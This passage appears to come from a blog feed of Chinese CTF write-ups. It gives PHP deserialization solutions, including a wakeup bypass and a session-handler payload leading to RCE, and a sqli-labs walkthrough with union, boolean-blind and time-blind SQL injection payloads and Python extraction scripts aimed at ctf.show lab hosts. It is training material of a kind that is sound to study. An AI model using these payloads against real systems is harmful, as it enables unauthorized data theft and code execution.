class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br></code></pre></td></tr></table></figure><h1 id="😯Mid-bestLanguage"><a href="#😯Mid-bestLanguage" class="headerlink" title="[😯Mid]bestLanguage"></a>[😯Mid]bestLanguage</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">superGate</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$gay</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-variable">$honey</span> = unserialize(<span class="hljs-variable">$p</span>);<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/superGate/i&quot;</span>, serialize(<span class="hljs-variable">$honey</span>)))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no&quot;</span>;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-built_in">Exception</span>();<br>&#125;<br><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>烂活题</p><p>最开始想着绕过superGate，发现绕不过去</p><p>本地跑下源码</p><p><img src="/2021/10/07/CNSS/image-20211020093729459.png" alt="image-20211020093729459"></p><p>这个errr_reporting(0)是不回显报错的意思，把他给注释掉</p><p><img src="/2021/10/07/CNSS/image-20211020093938885.png" alt="image-20211020093938885"></p><p>去传参看看怎么报错，是这个Expection方法没定义，最开始想的是原生类反序列化，但是并没有调用的方法，突然灵光一现，能不能把expection这个方法给定义了，但是反序列化是不能直接定义方法的，但是又想到expection类里面有Expection方法，那就去extends一下，看看能不能行</p><p><img src="/2021/10/07/CNSS/image-20211020094416084.png" alt="image-20211020094416084"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;superGate&quot;</span>:<span class="hljs-number">8</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;gay&quot;</span>;<span class="hljs-selector-tag">b</span>:<span class="hljs-number">1</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;*message&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;Exceptionstring&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;*code&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;*file&quot;</span>;s:<span class="hljs-number">28</span>:<span class="hljs-string">&quot;D:\phpstudy_pro\WWW\test.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;*line&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">8</span>;s:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;Exceptiontrace&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>:&#123;&#125;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Exceptionprevious&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/10/07/CNSS/image-20211020094453761.png" alt="image-20211020094453761"></p><p>成功打通</p><p>这种方法平时确实很少见</p><h1 id="😮Mid-To-be-Admin-Again"><a href="#😮Mid-To-be-Admin-Again" class="headerlink" title="[😮Mid]To_be_Admin_Again"></a>[😮Mid]To_be_Admin_Again</h1><p>老题了 利用的是</p><p>session.serialize_handler设置的设置的方式不同造成的反序列化，还有wakeup的绕过</p><p>参考文章</p><p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CNSS</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-keyword">$this</span>-&gt;code=<span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> CNSS();<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-string">&quot;|&quot;</span>.serialize(<span class="hljs-variable">$a</span>));<br><br></code></pre></td></tr></table></figure><p>在save.php里传参(注意此时需要修改属性数量绕过wakeup)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">？cnss=%<span class="hljs-number">7</span>CO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>CNSS%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>CNSS%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>CNSS%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>phpinfo%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>然后返回主页刷新即可rce</p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/08/23/sqllibs/"/>
    <url>/2021/08/23/sqllibs/</url>
    
    <content type="html"><![CDATA[<h1 id="sqllibs"><a href="#sqllibs" class="headerlink" title="sqllibs"></a>sqllibs</h1><blockquote><p>打完自贸港赛，有道sql注入没出，痛失第一，痛定思痛，通过sqllibs去系统的总结下sql注入</p></blockquote><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>联合注入</p><p>字符型注入</p><p> 拿ctfshow的靶场来查 有专门存flag的地方 更明确</p><figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,group_concat(flag),3 from ctfshow.flag --+</span><br></code></pre></td></tr></table></figure><p>由此可知 只要能查东西 就直接从这里查就行 </p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>数字型注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(flagac),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> ctfshow.flagaa<span class="hljs-comment">--+ tablename flagaa</span><br></code></pre></td></tr></table></figure><p>学聪明了 名字给改了 但是问题不大 还是很简单就查出来了 </p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>都失效了 就尝试去分析sqllibs的源码 找到注入点</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>(<span class="hljs-string">&#x27;$id&#x27;</span>) LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>他是加了个括号  就想着能不能把括号给闭合了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,group_concat(flagaca),3 from ctfshow.flagaanec--+</span><br></code></pre></td></tr></table></figure><h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(1) union select 1,2,3 --+) LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure><p>这个就加个双引号去闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">100</span>&quot;)union select 1,group_concat(flag23),3 from ctfshow.flagsf<br></code></pre></td></tr></table></figure><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://0c0fad01-b166-4997-8bf5-ad58391df32a.challenge.ctf.show:8080/?id=&quot;</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;,&#x27;</span>:<br>        payload=<span class="hljs-string">&quot;1&#x27;and substr((select flag33 from ctfshow.flagpuck),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(i,j)<br>        <span class="hljs-comment"># tablename=flagpuck</span><br>        <span class="hljs-comment"># columnname=flag33</span><br>        r=requests.get(url=url+payload)<br>        <span class="hljs-comment"># print (r.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in...........&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag+=j<br>            <span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><p>布尔盲注</p><p>顺便学下如何用二分法去盲注，首先要搞清楚二分法的原理，二分法，在数据结构中学过 有一个头和尾巴</p><p><img src="/2021/08/23/sqllibs/Users\dingr\AppData\Roaming\Typora\typora-user-images\image-20210823090824446.png" alt="image-20210823090824446"></p><p>如果需要使用二分法 需要用if语句 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(ascii(substr(database,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span>mid,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-operator">/</span><span class="hljs-operator">/</span>如果大于mid 就返回<span class="hljs-number">1</span> 如果小于就返回<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>通过while 逐渐向正确值靠拢 直到两者相等 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&#x27;http://fb471601-d073-4684-b4ee-0d33c10b3c95.challenge.ctf.show:8080/?id=&#x27;</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagpuck&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(flag33) from ctfshow.flagpuck),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            payload=<span class="hljs-string">r&quot;1&#x27; and if(ascii(substr(database(),%d,1))&gt;%d,1,0)--+&quot;</span>%(i,mid)<br>            r=requests.get(url=url+payload)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;You are in...........&#x27;</span> <span class="hljs-keyword">in</span> r.text):<br>                low=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high=mid<br>        <span class="hljs-keyword">if</span> low!=<span class="hljs-number">32</span>:<br>            result += <span class="hljs-built_in">chr</span>(low)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span> (result)<br>                <br><br></code></pre></td></tr></table></figure><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot;and substr(database(),1,1)=&#x27;c&#x27; --+<br></code></pre></td></tr></table></figure><p>用“闭合的布尔盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://0c0fad01-b166-4997-8bf5-ad58391df32a.challenge.ctf.show:8080/?id=&quot;</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;,&#x27;</span>:<br>        payload=<span class="hljs-string">&quot;1 \&quot;and substr((select flag33 from ctfshow.flagpuck),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(i,j)<br>        <span class="hljs-comment"># tablename=flagpuck</span><br>        <span class="hljs-comment"># columnname=flag33</span><br>        r=requests.get(url=url+payload)<br>        <span class="hljs-comment"># print (r.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in...........&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag+=j<br>            <span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h1 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h1><p>双括号闭合的布尔盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span><span class="hljs-string">&#x27;))and substr(database(),2,1)=&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://0c0fad01-b166-4997-8bf5-ad58391df32a.challenge.ctf.show:8080/?id=&quot;</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;,&#x27;</span>:<br>        payload=<span class="hljs-string">&quot;1 &#x27;))and substr((select flag33 from ctfshow.flagpuck),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(i,j)<br>        <span class="hljs-comment"># tablename=flagpuck</span><br>        <span class="hljs-comment"># columnname=flag33</span><br>        r=requests.get(url=url+payload)<br>        <span class="hljs-comment"># print (r.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in...........&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag+=j<br>            <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url=<span class="hljs-string">&quot;http://24a28ffa-52c1-4b4e-ab08-72e1c6f78c90.challenge.ctf.show:8080/?id=1&#x27;&quot;</span><br>    result=<span class="hljs-string">&#x27;&#x27;</span><br>    i=<span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i+=<span class="hljs-number">1</span><br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br><br>            mid=(head+tail)//<span class="hljs-number">2</span><br>            payload=<span class="hljs-string">r&quot;and if(ascii(substr(database(),%d,1))&gt;%d,sleep(2),0) --+&quot;</span>%(i,mid)<br>            <br>            <span class="hljs-keyword">try</span>:<br>                r=requests.get(url=url+payload,timeout=<span class="hljs-number">0.5</span>)<br>                tail=mid<br>            <span class="hljs-keyword">except</span>:<br>                head=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> (head!=<span class="hljs-number">32</span>):<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(result)<br><br><br></code></pre></td></tr></table></figure><p>这里用到了参数timeout， 他其实就是响应时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>headers = &#123;<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;keep-alive&quot;</span>&#125;<br><span class="hljs-keyword">try</span>:<br>    r=requests.get(url=<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,timeout=<span class="hljs-number">0.000001</span>)<br>    <span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rrrr&quot;</span>)<br></code></pre></td></tr></table></figure><p>他会自动过滤时间较长的 从而执行expect部分</p><h1 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h1><p>“闭合的时间盲注</p><h1 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h1><p>登入名处注入  easy</p><h1 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h1><p>“)闭合 </p><h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><p>这题没有回显，但是如果注入成功，会有一个<code>flag.jpg</code>的图片，注入失败，会有<code>slap.jpg</code>的图片，可以利用这个来进行布尔盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&#x27;http://9301abaf-d8ee-4cc9-a060-6aad4a35035b.challenge.ctf.show:8080&#x27;</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span><br>            payload = <span class="hljs-string">f&#x27;if(ascii(substr((select group_concat(flag4) from ctfshow.flag),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)&#x27;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            data = &#123;<br>                <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">f&quot;admin&#x27;) and <span class="hljs-subst">&#123;payload&#125;</span>#&quot;</span>,<br>                <span class="hljs-string">&#x27;passwd&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span><br>            &#125;<br>            <span class="hljs-comment"># print(data[&#x27;uname&#x27;])</span><br>            r = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += <span class="hljs-built_in">chr</span>(low)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><h1 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h1><p>报错注入</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>日记</title>
    <link href="/2016/09/01/%E6%97%A5%E8%AE%B0/"/>
    <url>/2016/09/01/%E6%97%A5%E8%AE%B0/</url>
    
